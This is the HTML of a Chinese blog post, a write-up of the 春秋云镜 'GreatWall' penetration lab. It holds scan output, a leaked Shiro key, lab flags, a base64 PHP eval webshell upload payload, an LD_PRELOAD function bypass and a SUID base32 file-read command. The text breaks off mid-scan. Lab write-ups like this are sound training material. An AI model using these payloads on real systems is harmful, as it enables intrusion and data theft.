<!DOCTYPE html>
<html lang="zh" dir="auto">

<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>春秋云镜-长城杯2024-Writeup | Xrntkk&#39;s Blog</title>
<meta name="keywords" content="writeup, 渗透, 春秋云镜">
<meta name="description" content="
参考文章
春秋云境-GreatWall(长城杯半决赛) – fushulingのblog
春秋云境 GreatWall(第一届长城杯半决赛渗透题) - Dr0n&rsquo;s blog
春秋云境-GreatWall-先知社区
Thinkphp5.2.3
先扫一下端口，扫出来8080端口有个后台服务">
<meta name="author" content="Xrntkk">
<link rel="canonical" href="http://localhost:1313/post/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-%E9%95%BF%E5%9F%8E%E6%9D%AF2024-writeup/">

<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
  <meta name="referrer" content="no-referrer-when-downgrade">
<link crossorigin="anonymous" href="/assets/css/stylesheet.e624e7dff45bacc4142784fe89280441dd4670102d43590c5171410d3d0b1877.css" integrity="sha256-5iTn3/RbrMQUJ4T&#43;iSgEQd1GcBAtQ1kMUXFBDT0LGHc=" rel="preload stylesheet" as="style">
<link rel="icon" href="http://localhost:1313/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<link rel="alternate" hreflang="zh" href="http://localhost:1313/post/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-%E9%95%BF%E5%9F%8E%E6%9D%AF2024-writeup/">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
</noscript><link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,100..800;1,100..800&display=swap" rel="stylesheet">
<meta name="baidu-site-verification" content="codeva-snmPZ4WZk8" /><meta property="og:url" content="http://localhost:1313/post/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-%E9%95%BF%E5%9F%8E%E6%9D%AF2024-writeup/">
  <meta property="og:site_name" content="Xrntkk&#39;s Blog">
  <meta property="og:title" content="春秋云镜-长城杯2024-Writeup">
  <meta property="og:description" content=" 参考文章
春秋云境-GreatWall(长城杯半决赛) – fushulingのblog
春秋云境 GreatWall(第一届长城杯半决赛渗透题) - Dr0n’s blog
春秋云境-GreatWall-先知社区
Thinkphp5.2.3 先扫一下端口，扫出来8080端口有个后台服务">
  <meta property="og:locale" content="zh">
  <meta property="og:type" content="article">
    <meta property="article:section" content="post">
    <meta property="article:published_time" content="2025-05-20T22:00:00+08:00">
    <meta property="article:modified_time" content="2025-05-20T22:00:00+08:00">
    <meta property="article:tag" content="Writeup">
    <meta property="article:tag" content="渗透">
    <meta property="article:tag" content="春秋云镜">
      <meta property="og:image" content="https://i.postimg.cc/7hwBy7VS/calcr.png">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://i.postimg.cc/7hwBy7VS/calcr.png">
<meta name="twitter:title" content="春秋云镜-长城杯2024-Writeup">
<meta name="twitter:description" content="
参考文章
春秋云境-GreatWall(长城杯半决赛) – fushulingのblog
春秋云境 GreatWall(第一届长城杯半决赛渗透题) - Dr0n&rsquo;s blog
春秋云境-GreatWall-先知社区
Thinkphp5.2.3
先扫一下端口，扫出来8080端口有个后台服务">


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Posts",
      "item": "http://localhost:1313/post/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "春秋云镜-长城杯2024-Writeup",
      "item": "http://localhost:1313/post/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-%E9%95%BF%E5%9F%8E%E6%9D%AF2024-writeup/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "春秋云镜-长城杯2024-Writeup",
  "name": "春秋云镜-长城杯2024-Writeup",
  "description": " 参考文章\n春秋云境-GreatWall(长城杯半决赛) – fushulingのblog\n春秋云境 GreatWall(第一届长城杯半决赛渗透题) - Dr0n\u0026rsquo;s blog\n春秋云境-GreatWall-先知社区\nThinkphp5.2.3 先扫一下端口，扫出来8080端口有个后台服务\n",
  "keywords": [
    "writeup", "渗透", "春秋云镜"
  ],
  "articleBody": " 参考文章\n春秋云境-GreatWall(长城杯半决赛) – fushulingのblog\n春秋云境 GreatWall(第一届长城杯半决赛渗透题) - Dr0n’s blog\n春秋云境-GreatWall-先知社区\nThinkphp5.2.3 先扫一下端口，扫出来8080端口有个后台服务\n访问8080端口\n发现这玩意根本不会发起登录请求，就是个前端壳子\ndirsearch扫一下，看到有个404\n1PS C:\\Users\\Xrntkk\u003e dirsearch -u http://8.130.147.101:8080/ 2 3 _|. _ _ _ _ _ _|_ v0.4.3.post1 4 (_||| _) (/_(_|| (_| ) 5 6Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460 7 8Output File: C:\\Users\\Xrntkk\\reports\\http_8.130.147.101_8080\\__25-05-16_12-34-50.txt 9 10Target: http://8.130.147.101:8080/ 11 12[12:34:50] Starting: 13[12:34:53] 403 - 280B - /.ht_wsr.txt 14[12:34:53] 403 - 280B - /.htaccess.bak1 15[12:34:53] 403 - 280B - /.htaccess.orig 16[12:34:53] 403 - 280B - /.htaccess.sample 17[12:34:53] 403 - 280B - /.htaccess.save 18[12:34:53] 403 - 280B - /.htaccess_extra 19[12:34:53] 403 - 280B - /.htaccess_orig 20[12:34:53] 403 - 280B - /.htaccess_sc 21[12:34:53] 403 - 280B - /.htaccessOLD 22[12:34:53] 403 - 280B - /.htaccessOLD2 23[12:34:53] 403 - 280B - /.htaccessBAK 24[12:34:53] 403 - 280B - /.htm 25[12:34:53] 403 - 280B - /.html 26[12:34:53] 403 - 280B - /.htpasswds 27[12:34:53] 403 - 280B - /.htpasswd_test 28[12:34:53] 403 - 280B - /.httr-oauth 29[12:34:54] 403 - 280B - /.php 30[12:35:12] 404 - 7KB - /index.php/login/ 31[12:35:21] 200 - 24B - /robots.txt 32[12:35:22] 403 - 280B - /server-status/ 33[12:35:22] 403 - 280B - /server-status 34[12:35:24] 301 - 322B - /static -\u003e http://8.130.147.101:8080/static/ 35 36Task Completed 访问404的路由即可拿到框架信息\n/index.php/login/\n直接上工具扫\n可以RCE\nFLAG1\nwww-data@portal:/tmp$ cat /f1ag01_UdEv.txt flag01: flag{176f49b6-147f-4557-99ec-ba0a351e1ada} 第一层 智联科技 ERP 信息收集一手\n1www-data@portal:/tmp$ ip addr show 21: lo: mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000 3 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 4 inet 127.0.0.1/8 scope host lo 5 valid_lft forever preferred_lft forever 6 inet6 ::1/128 scope host 7 valid_lft forever preferred_lft forever 82: eth0: mtu 1500 qdisc mq state UP group default qlen 1000 9 link/ether 00:16:3e:09:56:b7 brd ff:ff:ff:ff:ff:ff 10 inet 172.28.23.17/16 brd 172.28.255.255 scope global dynamic eth0 11 valid_lft 1892157172sec preferred_lft 1892157172sec 12 inet6 fe80::216:3eff:fe09:56b7/64 scope link 13 valid_lft forever preferred_lft forever 传个fscan扫一下内网\n1www-data@portal:/tmp$ fscan -h 172.28.23.0/24 2┌──────────────────────────────────────────────┐ 3│ ___ _ │ 4│ / _ \\ ___ ___ _ __ __ _ ___| | __ │ 5│ / /_\\/____/ __|/ __| '__/ _` |/ __| |/ / │ 6│ / /_\\\\_____\\__ \\ (__| | | (_| | (__| \u003c │ 7│ \\____/ |___/\\___|_| \\__,_|\\___|_|\\_\\ │ 8└──────────────────────────────────────────────┘ 9 Fscan Version: 2.0.0 10 11[2025-05-16 12:56:20] [INFO] 暴力破解线程数: 1 12[2025-05-16 12:56:20] [INFO] 开始信息扫描 13[2025-05-16 12:56:20] [INFO] CIDR范围: 172.28.23.0-172.28.23.255 14[2025-05-16 12:56:20] [INFO] 生成IP范围: 172.28.23.0.%!d(string=172.28.23.255) - %!s(MISSING).%!d(MISSING) 15[2025-05-16 12:56:20] [INFO] 解析CIDR 172.28.23.0/24 -\u003e IP范围 172.28.23.0-172.28.23.255 16[2025-05-16 12:56:20] [INFO] 最终有效主机数量: 256 17[2025-05-16 12:56:20] [INFO] 开始主机扫描 18[2025-05-16 12:56:20] [INFO] 正在尝试无监听ICMP探测... 19[2025-05-16 12:56:20] [INFO] 当前用户权限不足,无法发送ICMP包 20[2025-05-16 12:56:20] [INFO] 切换为PING方式探测... 21[2025-05-16 12:56:20] [SUCCESS] 目标 172.28.23.33 存活 (ICMP) 22[2025-05-16 12:56:20] [SUCCESS] 目标 172.28.23.17 存活 (ICMP) 23[2025-05-16 12:56:20] [SUCCESS] 目标 172.28.23.26 存活 (ICMP) 24[2025-05-16 12:56:26] [INFO] 存活主机数量: 3 25[2025-05-16 12:56:26] [INFO] 有效端口数量: 233 26[2025-05-16 12:56:26] [SUCCESS] 端口开放 172.28.23.17:22 27[2025-05-16 12:56:26] [SUCCESS] 端口开放 172.28.23.26:80 28[2025-05-16 12:56:26] [SUCCESS] 端口开放 172.28.23.17:80 29[2025-05-16 12:56:26] [SUCCESS] 端口开放 172.28.23.26:22 30[2025-05-16 12:56:26] [SUCCESS] 端口开放 172.28.23.33:22 31[2025-05-16 12:56:26] [SUCCESS] 端口开放 172.28.23.26:21 32[2025-05-16 12:56:26] [SUCCESS] 端口开放 172.28.23.33:8080 33[2025-05-16 12:56:26] [SUCCESS] 端口开放 172.28.23.17:8080 34[2025-05-16 12:56:26] [SUCCESS] 服务识别 172.28.23.17:22 =\u003e [ssh] 版本:8.2p1 Ubuntu 4ubuntu0.7 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.7.] 35[2025-05-16 12:56:27] [SUCCESS] 服务识别 172.28.23.26:22 =\u003e [ssh] 版本:7.2p2 Ubuntu 4ubuntu2.10 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.10.] 36[2025-05-16 12:56:27] [SUCCESS] 服务识别 172.28.23.33:22 =\u003e [ssh] 版本:8.2p1 Ubuntu 4ubuntu0.10 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.10.] 37[2025-05-16 12:56:27] [SUCCESS] 服务识别 172.28.23.26:21 =\u003e [ftp] 版本:3.0.3 产品:vsftpd 系统:Unix Banner:[220 (vsFTPd 3.0.3).] 38[2025-05-16 12:56:32] [SUCCESS] 服务识别 172.28.23.33:8080 =\u003e [http] 39[2025-05-16 12:56:32] [SUCCESS] 服务识别 172.28.23.17:8080 =\u003e [http] 40[2025-05-16 12:56:33] [SUCCESS] 服务识别 172.28.23.17:80 =\u003e [http] 41[2025-05-16 12:56:33] [SUCCESS] 服务识别 172.28.23.26:80 =\u003e [http] 42[2025-05-16 12:56:33] [INFO] 存活端口数量: 8 43[2025-05-16 12:56:33] [INFO] 开始漏洞扫描 44[2025-05-16 12:56:33] [INFO] 加载的插件: ftp, ssh, webpoc, webtitle 45[2025-05-16 12:56:33] [SUCCESS] 网站标题 http://172.28.23.17 状态码:200 长度:10887 标题:\"\" 46[2025-05-16 12:56:33] [SUCCESS] 网站标题 http://172.28.23.17:8080 状态码:200 长度:1027 标题:Login Form 47[2025-05-16 12:56:33] [SUCCESS] 网站标题 http://172.28.23.26 状态码:200 长度:13693 标题:新翔OA管理系统-OA管理平台联系电话：13849422648微信同号，QQ958756413 48[2025-05-16 12:56:33] [SUCCESS] 网站标题 http://172.28.23.33:8080 状态码:302 长度:0 标题:无标题 重定向地址: http://172.28.23.33:8080/login;jsessionid=AE63E07F48E94D58CCBB77518E0021A7 49[2025-05-16 12:56:33] [SUCCESS] 匿名登录成功! 50[2025-05-16 12:56:33] [SUCCESS] 网站标题 http://172.28.23.33:8080/login;jsessionid=AE63E07F48E94D58CCBB77518E0021A7 状态码:200 长度:3860 标题:智联科技 ERP 后台登陆 51[2025-05-16 12:56:34] [SUCCESS] 目标: http://172.28.23.17:8080 52 漏洞类型: poc-yaml-thinkphp5023-method-rce 53 漏洞名称: poc1 54 详细信息: 55 links:https://github.com/vulhub/vulhub/tree/master/thinkphp/5.0.23-rce 56[2025-05-16 12:56:34] [SUCCESS] 目标: http://172.28.23.33:8080 57 漏洞类型: poc-yaml-spring-actuator-heapdump-file 58 漏洞名称: 59 详细信息: 60 author:AgeloVito 61 links:https://www.cnblogs.com/wyb628/p/8567610.html 62[2025-05-16 12:56:35] [SUCCESS] 目标: http://172.28.23.33:8080 63 漏洞类型: poc-yaml-springboot-env-unauth 64 漏洞名称: spring2 65 详细信息: 66 links:https://github.com/LandGrey/SpringBootVulExploit 扫到另外两台机子\n[2025-05-16 12:56:20] [SUCCESS] 目标 172.28.23.33 存活 (ICMP)\r[2025-05-16 12:56:20] [SUCCESS] 目标 172.28.23.17 存活 (ICMP) //入口机\r[2025-05-16 12:56:20] [SUCCESS] 目标 172.28.23.26 存活 (ICMP) 其中33扫出来存在spring Actuator未授权访问和env泄露\nSpringboot Actuator未授权访问漏洞复现-腾讯云开发者社区-腾讯云\n/actuator/env\n1{\"activeProfiles\":[],\"propertySources\":[{\"name\":\"server.ports\",\"properties\":{\"local.server.port\":{\"value\":8080}}},{\"name\":\"servletContextInitParams\",\"properties\":{}},{\"name\":\"systemProperties\",\"properties\":{\"java.runtime.name\":{\"value\":\"OpenJDK Runtime Environment\"},\"java.protocol.handler.pkgs\":{\"value\":\"org.springframework.boot.loader\"},\"sun.boot.library.path\":{\"value\":\"/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/amd64\"},\"java.vm.version\":{\"value\":\"25.392-b08\"},\"java.vm.vendor\":{\"value\":\"Private Build\"},\"java.vendor.url\":{\"value\":\"http://java.oracle.com/\"},\"path.separator\":{\"value\":\":\"},\"java.vm.name\":{\"value\":\"OpenJDK 64-Bit Server VM\"},\"file.encoding.pkg\":{\"value\":\"sun.io\"},\"user.country\":{\"value\":\"US\"},\"sun.java.launcher\":{\"value\":\"SUN_STANDARD\"},\"sun.os.patch.level\":{\"value\":\"unknown\"},\"PID\":{\"value\":\"663\"},\"java.vm.specification.name\":{\"value\":\"Java Virtual Machine Specification\"},\"user.dir\":{\"value\":\"/\"},\"java.runtime.version\":{\"value\":\"1.8.0_392-8u392-ga-1~20.04-b08\"},\"java.awt.graphicsenv\":{\"value\":\"sun.awt.X11GraphicsEnvironment\"},\"java.endorsed.dirs\":{\"value\":\"/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/endorsed\"},\"os.arch\":{\"value\":\"amd64\"},\"CONSOLE_LOG_CHARSET\":{\"value\":\"UTF-8\"},\"java.io.tmpdir\":{\"value\":\"/tmp\"},\"line.separator\":{\"value\":\"\\n\"},\"java.vm.specification.vendor\":{\"value\":\"Oracle Corporation\"},\"os.name\":{\"value\":\"Linux\"},\"FILE_LOG_CHARSET\":{\"value\":\"UTF-8\"},\"sun.jnu.encoding\":{\"value\":\"UTF-8\"},\"spring.beaninfo.ignore\":{\"value\":\"true\"},\"java.library.path\":{\"value\":\"/usr/java/packages/lib/amd64:/usr/lib/x86_64-linux-gnu/jni:/lib/x86_64-linux-gnu:/usr/lib/x86_64-linux-gnu:/usr/lib/jni:/lib:/usr/lib\"},\"java.specification.name\":{\"value\":\"Java Platform API Specification\"},\"java.class.version\":{\"value\":\"52.0\"},\"sun.management.compiler\":{\"value\":\"HotSpot 64-Bit Tiered Compilers\"},\"os.version\":{\"value\":\"5.4.0-169-generic\"},\"user.home\":{\"value\":\"/home/ops01\"},\"catalina.useNaming\":{\"value\":\"false\"},\"user.timezone\":{\"value\":\"Asia/Shanghai\"},\"java.awt.printerjob\":{\"value\":\"sun.print.PSPrinterJob\"},\"file.encoding\":{\"value\":\"UTF-8\"},\"java.specification.version\":{\"value\":\"1.8\"},\"catalina.home\":{\"value\":\"/tmp/tomcat.8080.6309224585124471589\"},\"java.class.path\":{\"value\":\"/opt/erp/ERPApplication-0.0.1-SNAPSHOT.jar\"},\"user.name\":{\"value\":\"ops01\"},\"java.vm.specification.version\":{\"value\":\"1.8\"},\"sun.java.command\":{\"value\":\"******\"},\"java.home\":{\"value\":\"/usr/lib/jvm/java-8-openjdk-amd64/jre\"},\"sun.arch.data.model\":{\"value\":\"64\"},\"user.language\":{\"value\":\"en\"},\"java.specification.vendor\":{\"value\":\"Oracle Corporation\"},\"awt.toolkit\":{\"value\":\"sun.awt.X11.XToolkit\"},\"java.vm.info\":{\"value\":\"mixed mode\"},\"java.version\":{\"value\":\"1.8.0_392\"},\"java.ext.dirs\":{\"value\":\"/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/ext:/usr/java/packages/lib/ext\"},\"sun.boot.class.path\":{\"value\":\"/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/resources.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/rt.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/sunrsasign.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/jsse.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/jce.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/charsets.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/jfr.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/classes\"},\"java.awt.headless\":{\"value\":\"true\"},\"java.vendor\":{\"value\":\"Private Build\"},\"catalina.base\":{\"value\":\"/tmp/tomcat.8080.6309224585124471589\"},\"java.specification.maintenance.version\":{\"value\":\"5\"},\"file.separator\":{\"value\":\"/\"},\"java.vendor.url.bug\":{\"value\":\"http://bugreport.sun.com/bugreport/\"},\"sun.io.unicode.encoding\":{\"value\":\"UnicodeLittle\"},\"sun.cpu.endian\":{\"value\":\"little\"},\"sun.cpu.isalist\":{\"value\":\"\"}}},{\"name\":\"systemEnvironment\",\"properties\":{\"PATH\":{\"value\":\"/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\",\"origin\":\"System Environment Property \\\"PATH\\\"\"},\"INVOCATION_ID\":{\"value\":\"18b641dc6657423cbdeab6262fd1ee07\",\"origin\":\"System Environment Property \\\"INVOCATION_ID\\\"\"},\"JOURNAL_STREAM\":{\"value\":\"9:19204\",\"origin\":\"System Environment Property \\\"JOURNAL_STREAM\\\"\"},\"LOGNAME\":{\"value\":\"ops01\",\"origin\":\"System Environment Property \\\"LOGNAME\\\"\"},\"USER\":{\"value\":\"ops01\",\"origin\":\"System Environment Property \\\"USER\\\"\"},\"PWD\":{\"value\":\"/\",\"origin\":\"System Environment Property \\\"PWD\\\"\"},\"LANG\":{\"value\":\"en_US.UTF-8\",\"origin\":\"System Environment Property \\\"LANG\\\"\"},\"SHLVL\":{\"value\":\"0\",\"origin\":\"System Environment Property \\\"SHLVL\\\"\"},\"HOME\":{\"value\":\"/home/ops01\",\"origin\":\"System Environment Property \\\"HOME\\\"\"},\"_\":{\"value\":\"/usr/bin/java\",\"origin\":\"System Environment Property \\\"_\\\"\"}}},{\"name\":\"Config resource 'class path resource [application.properties]' via location 'optional:classpath:/'\",\"properties\":{\"server.port\":{\"value\":\"8080\",\"origin\":\"class path resource [application.properties] from ERPApplication-0.0.1-SNAPSHOT.jar - 1:13\"},\"management.endpoints.jmx.exposure.include\":{\"value\":\"*\",\"origin\":\"class path resource [application.properties] from ERPApplication-0.0.1-SNAPSHOT.jar - 3:43\"},\"management.endpoints.web.exposure.include\":{\"value\":\"*\",\"origin\":\"class path resource [application.properties] from ERPApplication-0.0.1-SNAPSHOT.jar - 4:43\"},\"management.endpoint.health.show-details\":{\"value\":\"always\",\"origin\":\"class path resource [application.properties] from ERPApplication-0.0.1-SNAPSHOT.jar - 5:41\"},\"spring.thymeleaf.cache\":{\"value\":\"true\",\"origin\":\"class path resource [application.properties] from ERPApplication-0.0.1-SNAPSHOT.jar - 8:24\"},\"spring.thymeleaf.check-template\":{\"value\":\"true\",\"origin\":\"class path resource [application.properties] from ERPApplication-0.0.1-SNAPSHOT.jar - 9:33\"},\"spring.thymeleaf.check-template-location\":{\"value\":\"true\",\"origin\":\"class path resource [application.properties] from ERPApplication-0.0.1-SNAPSHOT.jar - 10:42\"},\"spring.thymeleaf.content-type\":{\"value\":\"text/html\",\"origin\":\"class path resource [application.properties] from ERPApplication-0.0.1-SNAPSHOT.jar - 11:31\"},\"spring.thymeleaf.enabled\":{\"value\":\"true\",\"origin\":\"class path resource [application.properties] from ERPApplication-0.0.1-SNAPSHOT.jar - 12:26\"},\"spring.thymeleaf.encoding\":{\"value\":\"UTF-8\",\"origin\":\"class path resource [application.properties] from ERPApplication-0.0.1-SNAPSHOT.jar - 13:27\"},\"spring.thymeleaf.excluded-view-names\":{\"value\":\"\",\"origin\":\"class path resource [application.properties] from ERPApplication-0.0.1-SNAPSHOT.jar - 15:0\"},\"spring.thymeleaf.mode\":{\"value\":\"HTML5\",\"origin\":\"class path resource [application.properties] from ERPApplication-0.0.1-SNAPSHOT.jar - 15:23\"},\"spring.thymeleaf.prefix\":{\"value\":\"classpath:/templates/\",\"origin\":\"class path resource [application.properties] from ERPApplication-0.0.1-SNAPSHOT.jar - 16:25\"},\"spring.thymeleaf.suffix\":{\"value\":\".html\",\"origin\":\"class path resource [application.properties] from ERPApplication-0.0.1-SNAPSHOT.jar - 17:25\"}}}]} 用whwlsfb/JDumpSpider: HeapDump敏感信息提取工具自动提取heapdump敏感信息\n可以拿到shiro key\n===========================================\rCookieRememberMeManager(ShiroKey)\r-------------\ralgMode = GCM, key = AZYyIgMYhG6/CzIJlvpR2g==, algName = AES\r=========================================== shiro反序列化打CB链，成功RCE\n没有找到flag，说明要提权\n/home/ops01里面有一个HashNote，且监听了59696端口，说明要打pwn来提权\n不会打pwn，这里直接拿别人的exp梭哈了\nFLAG2\n$ cat /root/flag_RaYz1/f1ag03.txt\rflag03: flag{6a326f94-6526-4586-8233-152d137281fd} 新翔OA管理系统 前面fscan扫到172.28.23.26有个ftp服务\n[2025-05-16 12:56:27] [SUCCESS] 服务识别 172.28.23.26:21 =\u003e [ftp] 版本:3.0.3 产品:vsftpd 系统:Unix Banner:[220 (vsFTPd 3.0.3).] 匿名用户可以直接登录\n可以拿到oa的源码，扒下来审计\n可以看到这个\nuploadbase64.php\n1\u003c?php 2/** 3 * Description: PhpStorm. 4 * Author: yoby 5 * DateTime: 2018/12/4 18:01 6 * Email:logove@qq.com 7 * Copyright Yoby版权所有 8 */ 9$img = $_POST['imgbase64']; 10if (preg_match('/^(data:\\s*image\\/(\\w+);base64,)/', $img, $result)) { 11 $type = \".\".$result[2]; 12 $path = \"upload/\" . date(\"Y-m-d\") . \"-\" . uniqid() . $type; 13} 14$img = base64_decode(str_replace($result[1], '', $img)); 15@file_put_contents($path, $img); 16exit('{\"src\":\"'.$path.'\"}'); 理解一下这个正则\n^ 匹配字符串的开始位置，确保从数据的起始处开始匹配 data: 直接匹配字面字符串 “data:\"，这是 Data URL 格式的固定前缀 \\s\\* 匹配零个或多个空白字符（包括空格、制表符等），用于处理可能存在的空格 image/ 直接匹配字面字符串 “image/\"，表明这是一个图片类型的数据 (\\w+) \\w 匹配任何单词字符（等价于 [a-zA-Z0-9_]） + 表示前面的元素必须出现一次或多次 括号 () 用于捕获匹配的内容，这部分会被提取为图片类型（如 jpg、png） ;base64, 直接匹配字面字符串 “;base64,\"，这是 Base64 编码的 Data URL 的固定后缀 我们可以发现$result[1]和$result[2]是可控的\n也就是说我们可以写入任意文件，格式如下\ndata:image/文件后缀;base64,文件内容的base64编码 这里没有鉴权，直接写马\npayload\nimgbase64=data:image/php;base64, PD9waHAgZXZhbCgkX1BPU1RbJzEnXSk7Pz4= 上马子之后发现有很多disable_functions，没办法RCE\npcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,file_get_contents,readfile,debug_backtrace,debug_print_backtrace,gc_collect_cycles,array_merge_recursive,highlight_file,show_source,iconv,dl 我们可以利用环境变量 LD_PRELOAD 劫持系统函数，从而绕过\n蚁剑中有插件\n修改一下.antproxy.php中的url路径\n不知道这里一句话木马为什么不能用POST传参，用GET就可以正常RCEl\n发现没办法直接读flag，需要提权\n尝试suid提权\n1/bin/fusermount 2/bin/ping6 3/bin/mount 4/bin/su 5/bin/ping 6/bin/umount 7/usr/bin/chfn 8/usr/bin/newgrp 9/usr/bin/gpasswd 10/usr/bin/at 11/usr/bin/staprun 12/usr/bin/base32 13/usr/bin/passwd 14/usr/bin/chsh 15/usr/bin/sudo 16/usr/lib/dbus-1.0/dbus-daemon-launch-helper 17/usr/lib/openssh/ssh-keysign 18/usr/lib/eject/dmcrypt-get-device 19/usr/lib/s-nail/s-nail-privsep 用base32实现提权\npayload\n?1=system(\"base32 /flag02.txt|base32 --decode\"); FLAG3\nflag02: flag{56d37734-5f73-447f-b1a5-a83f45549b28} 第二层 分支一 [172.22.14.0/24] 传个fscan进行信息收集\nip addr\nwww-data@ubuntu-oa:/var/www/html/OAsystem/upload$ ip addr show\rip addr show\r1: lo: mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1\rlink/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\rinet 127.0.0.1/8 scope host lo\rvalid_lft forever preferred_lft forever\rinet6 ::1/128 scope host valid_lft forever preferred_lft forever\r2: eth0: mtu 1500 qdisc mq state UP group default qlen 1000\rlink/ether 00:16:3e:03:7a:cf brd ff:ff:ff:ff:ff:ff\rinet 172.28.23.26/16 brd 172.28.255.255 scope global eth0\rvalid_lft forever preferred_lft forever\rinet6 fe80::216:3eff:fe03:7acf/64 scope link valid_lft forever preferred_lft forever\r3: eth1: mtu 1500 qdisc mq state UP group default qlen 1000\rlink/ether 00:16:3e:03:7a:62 brd ff:ff:ff:ff:ff:ff\rinet 172.22.14.6/16 brd 172.22.255.255 scope global eth1\rvalid_lft forever preferred_lft forever\rinet6 fe80::216:3eff:fe03:7a62/64 scope link valid_lft forever preferred_lft forever fscan\n1┌──────────────────────────────────────────────┐ 2│ ___ _ │ 3│ / _ \\ ___ ___ _ __ __ _ ___| | __ │ 4│ / /_\\/____/ __|/ __| '__/ _` |/ __| |/ / │ 5│ / /_\\\\_____\\__ \\ (__| | | (_| | (__| \u003c │ 6│ \\____/ |___/\\___|_| \\__,_|\\___|_|\\_\\ │ 7└──────────────────────────────────────────────┘ 8 Fscan Version: 2.0.0 9 10[2025-05-22 18:49:34] [INFO] 暴力破解线程数: 1 11[2025-05-22 18:49:34] [INFO] 开始信息扫描 12[2025-05-22 18:49:34] [INFO] CIDR范围: 172.22.14.0-172.22.14.255 13[2025-05-22 18:49:34] [INFO] 生成IP范围: 172.22.14.0.%!d(string=172.22.14.255) - %!s(MISSING).%!d(MISSING) 14[2025-05-22 18:49:34] [INFO] 解析CIDR 172.22.14.0/24 -\u003e IP范围 172.22.14.0-172.22.14.255 15[2025-05-22 18:49:34] [INFO] 最终有效主机数量: 256 16[2025-05-22 18:49:34] [INFO] 开始主机扫描 17[2025-05-22 18:49:34] [INFO] 正在尝试无监听ICMP探测... 18[2025-05-22 18:49:34] [INFO] 当前用户权限不足,无法发送ICMP包 19[2025-05-22 18:49:35] [INFO] 切换为PING方式探测... 20[2025-05-22 18:49:35] [SUCCESS] 目标 172.22.14.6 存活 (ICMP) 21[2025-05-22 18:49:35] [SUCCESS] 目标 172.22.14.37 存活 (ICMP) 22[2025-05-22 18:49:35] [SUCCESS] 目标 172.22.14.46 存活 (ICMP) 23[2025-05-22 18:49:41] [INFO] 存活主机数量: 3 24[2025-05-22 18:49:41] [INFO] 有效端口数量: 65535 25[2025-05-22 18:49:41] [SUCCESS] 端口开放 172.22.14.6:21 26[2025-05-22 18:49:41] [SUCCESS] 服务识别 172.22.14.6:21 =\u003e [ftp] 版本:3.0.3 产品:vsftpd 系统:Unix Banner:[220 (vsFTPd 3.0.3).] 27[2025-05-22 18:49:41] [SUCCESS] 端口开放 172.22.14.6:22 28[2025-05-22 18:49:41] [SUCCESS] 端口开放 172.22.14.37:22 29[2025-05-22 18:49:41] [SUCCESS] 端口开放 172.22.14.46:22 30[2025-05-22 18:49:41] [SUCCESS] 端口开放 172.22.14.46:80 31[2025-05-22 18:49:41] [SUCCESS] 端口开放 172.22.14.6:80 32[2025-05-22 18:49:41] 